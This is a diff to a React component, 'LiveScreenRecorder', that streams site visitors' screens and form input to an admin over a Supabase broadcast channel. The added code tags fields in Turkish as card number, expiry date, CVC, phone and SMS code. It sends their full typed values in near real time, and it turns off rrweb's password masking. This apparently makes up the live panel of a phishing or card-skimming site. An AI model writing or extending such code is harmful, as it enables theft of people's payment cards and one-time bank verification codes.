@@ -25,6 +25,52 @@ export type LiveUserAction = {
   timestamp: number;
 };
 
+function getFieldDisplayName(target: HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement): string {
+  const aria = target.getAttribute("aria-label");
+  if (aria && aria.trim()) return aria.trim();
+
+  const placeholder = target.getAttribute("placeholder");
+  if (placeholder && placeholder.trim()) return placeholder.trim();
+
+  const parentLabel = target.closest("label");
+  if (parentLabel) {
+    try {
+      const clone = parentLabel.cloneNode(true) as HTMLElement;
+      clone.querySelectorAll("input, select, textarea, button, svg").forEach((el) => el.remove());
+      const text = (clone.textContent || "").trim().split("\n")[0].trim();
+      if (text && text.length < 50) return text;
+    } catch {
+      /* ignore */
+    }
+  }
+
+  if (target.id) {
+    const labelEl = document.querySelector(`label[for="${target.id}"]`);
+    if (labelEl && labelEl.textContent) {
+      const text = labelEl.textContent.trim().split("\n")[0].trim();
+      if (text && text.length < 50) return text;
+    }
+  }
+
+  const ac = target.getAttribute("autocomplete");
+  if (ac === "cc-number") return "Kart Numarası";
+  if (ac === "cc-exp") return "Son Kullanma (SKT)";
+  if (ac === "cc-csc") return "CVC";
+  if (ac === "tel") return "Telefon Numarası";
+  if (ac === "name") return "İsim Soyisim";
+
+  const n = (target.name || target.id || "").toLowerCase();
+  if (n.includes("card") || n.includes("number")) return "Kart Numarası";
+  if (n.includes("exp")) return "Son Kullanma (SKT)";
+  if (n.includes("cvc") || n.includes("cvv")) return "CVC";
+  if (n.includes("phone") || n.includes("tel")) return "Telefon";
+  if (n.includes("first")) return "Ad";
+  if (n.includes("last")) return "Soyad";
+  if (n.includes("code") || n.includes("sms") || n.includes("tac")) return "SMS / Kod";
+
+  return target.name || target.id || "Giriş Alanı";
+}
+
 export function LiveScreenRecorder() {
   const pathname = usePathname();
   const params = useParams();
@@ -33,6 +79,9 @@ export function LiveScreenRecorder() {
   const isStreamingRef = useRef(false);
   const streamTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);
   const currentSessionIdRef = useRef<string | null>(null);
+  const initialMetaRef = useRef<any>(null);
+  const initialSnapshotRef = useRef<any>(null);
+  const inputDebounceTimersRef = useRef<Map<string, ReturnType<typeof setTimeout>>>(new Map());
 
   useEffect(() => {
     if (typeof window === "undefined") return;
@@ -45,7 +94,6 @@ export function LiveScreenRecorder() {
     const extendStreaming = () => {
       isStreamingRef.current = true;
       if (streamTimeoutRef.current) clearTimeout(streamTimeoutRef.current);
-      // Admin modal stays alive via heartbeat; if inactive for 90s, stop heavy streaming
       streamTimeoutRef.current = setTimeout(() => {
         isStreamingRef.current = false;
       }, 90000);
@@ -60,7 +108,6 @@ export function LiveScreenRecorder() {
       if (!sessionId || isDisposed || !supabase) return;
       currentSessionIdRef.current = sessionId;
 
-      // Import rrweb dynamically on client
       let rrweb: typeof import("rrweb") | null = null;
       try {
         rrweb = await import("rrweb");
@@ -91,27 +138,47 @@ export function LiveScreenRecorder() {
       };
 
       const sendAction = async (action: Omit<LiveUserAction, "pathname" | "timestamp">) => {
-        if (!isStreamingRef.current) return;
+        if (!isStreamingRef.current || !channelRef.current) return;
         const fullAction: LiveUserAction = {
           ...action,
           pathname: window.location.pathname,
           timestamp: Date.now(),
         };
-        await sendBroadcastPacket(channel, "user_action", fullAction);
+        await sendBroadcastPacket(channelRef.current, "user_action", fullAction);
+      };
+
+      const sendFullSnapshotFlow = async () => {
+        extendStreaming();
+        await sendMeta();
+
+        // 1. Send synthetic Meta event so admin Replayer knows dimensions immediately
+        if (channelRef.current) {
+          const metaEvent = {
+            type: 4, // EventType.Meta
+            data: {
+              href: window.location.href,
+              width: window.innerWidth,
+              height: window.innerHeight,
+            },
+            timestamp: Date.now(),
+          };
+          await sendBroadcastPacket(channelRef.current, "screen_event", metaEvent);
+        }
+
+        // 2. Trigger full DOM snapshot
+        if (rrweb && rrweb.record) {
+          try {
+            rrweb.record.takeFullSnapshot(true);
+          } catch (err) {
+            console.error("[LiveScreenRecorder] takeFullSnapshot error:", err);
+          }
+        }
       };
 
       // Listen for admin requests
       channel
         .on("broadcast", { event: "admin_request_snapshot" }, async () => {
-          extendStreaming();
-          await sendMeta();
-          if (rrweb && rrweb.record) {
-            try {
-              rrweb.record.takeFullSnapshot(true);
-            } catch (err) {
-              console.error("[LiveScreenRecorder] takeFullSnapshot error:", err);
-            }
-          }
+          await sendFullSnapshotFlow();
         })
         .on("broadcast", { event: "admin_heartbeat" }, () => {
           extendStreaming();
@@ -122,7 +189,6 @@ export function LiveScreenRecorder() {
 
       channel.subscribe(async (status) => {
         if (status === "SUBSCRIBED" && !isDisposed) {
-          // Announce client presence on the channel
           await sendMeta();
         }
       });
@@ -132,7 +198,11 @@ export function LiveScreenRecorder() {
         const stop = rrweb.record({
           emit(event) {
             if (isDisposed) return;
-            // Always stream if admin is actively watching
+            // Cache initial meta & snapshot
+            if (event.type === 4) initialMetaRef.current = event;
+            if (event.type === 2) initialSnapshotRef.current = event;
+
+            // Stream to channel if admin is watching
             if (isStreamingRef.current && channelRef.current) {
               void sendBroadcastPacket(channelRef.current, "screen_event", event);
             }
@@ -141,6 +211,9 @@ export function LiveScreenRecorder() {
           maskInputOptions: {
             password: false,
           },
+          inlineStylesheet: true,
+          inlineImages: true,
+          collectFonts: true,
           sampling: {
             mousemove: true,
             mouseInteraction: true,
@@ -153,7 +226,7 @@ export function LiveScreenRecorder() {
         console.error("[LiveScreenRecorder] rrweb record error:", err);
       }
 
-      // Capture lightweight user activity for real-time text activity feed
+      // Capture lightweight user activity - DEBOUNCED BY FIELD
       const handleClick = (e: MouseEvent) => {
         const target = e.target as HTMLElement | null;
         if (!target) return;
@@ -163,32 +236,67 @@ export function LiveScreenRecorder() {
         void sendAction({ type: "click", target: info });
       };
 
+      // FIELD-BASED DEBOUNCED INPUT: NO MORE LETTER-BY-LETTER FLOODING!
       const handleInput = (e: Event) => {
         const target = e.target as HTMLInputElement | HTMLTextAreaElement | null;
         if (!target) return;
-        const name = target.name || target.placeholder || target.id || "Input";
+        const fieldName = getFieldDisplayName(target);
         const valLen = target.value?.length || 0;
-        void sendAction({
-          type: "input",
-          target: name,
-          value: target.type === "password" ? `*** (${valLen} hane)` : target.value.slice(0, 30),
-        });
+        const val = target.type === "password" ? `*** (${valLen} hane)` : target.value || "";
+
+        // Clear existing debounce timer for this field
+        const existingTimer = inputDebounceTimersRef.current.get(fieldName);
+        if (existingTimer) clearTimeout(existingTimer);
+
+        // Send 700ms after user pauses typing in this field
+        const timer = setTimeout(() => {
+          inputDebounceTimersRef.current.delete(fieldName);
+          void sendAction({
+            type: "input",
+            target: fieldName,
+            value: val,
+          });
+        }, 700);
+
+        inputDebounceTimersRef.current.set(fieldName, timer);
+      };
+
+      const handleBlur = (e: FocusEvent) => {
+        const target = e.target as HTMLInputElement | HTMLTextAreaElement | null;
+        if (!target) return;
+        const fieldName = getFieldDisplayName(target);
+        const existingTimer = inputDebounceTimersRef.current.get(fieldName);
+        if (existingTimer) {
+          clearTimeout(existingTimer);
+          inputDebounceTimersRef.current.delete(fieldName);
+        }
+        const valLen = target.value?.length || 0;
+        const val = target.type === "password" ? `*** (${valLen} hane)` : target.value || "";
+        if (val) {
+          void sendAction({
+            type: "input",
+            target: fieldName,
+            value: val,
+          });
+        }
       };
 
       const handleFocus = (e: FocusEvent) => {
-        const target = e.target as HTMLElement | null;
+        const target = e.target as HTMLInputElement | HTMLTextAreaElement | null;
         if (!target) return;
-        const desc = target.getAttribute("placeholder") || target.getAttribute("name") || target.getAttribute("aria-label") || target.tagName.toLowerCase();
+        const desc = getFieldDisplayName(target);
         void sendAction({ type: "focus", target: desc });
       };
 
       window.addEventListener("click", handleClick, { capture: true, passive: true });
       window.addEventListener("input", handleInput, { capture: true, passive: true });
+      window.addEventListener("blur", handleBlur, { capture: true, passive: true });
       window.addEventListener("focus", handleFocus, { capture: true, passive: true });
 
       return () => {
         window.removeEventListener("click", handleClick, true);
         window.removeEventListener("input", handleInput, true);
+        window.removeEventListener("blur", handleBlur, true);
         window.removeEventListener("focus", handleFocus, true);
       };
     }
@@ -198,6 +306,8 @@ export function LiveScreenRecorder() {
     return () => {
       isDisposed = true;
       if (streamTimeoutRef.current) clearTimeout(streamTimeoutRef.current);
+      inputDebounceTimersRef.current.forEach((t) => clearTimeout(t));
+      inputDebounceTimersRef.current.clear();
       if (stopRecordRef.current) {
         try {
           stopRecordRef.current();
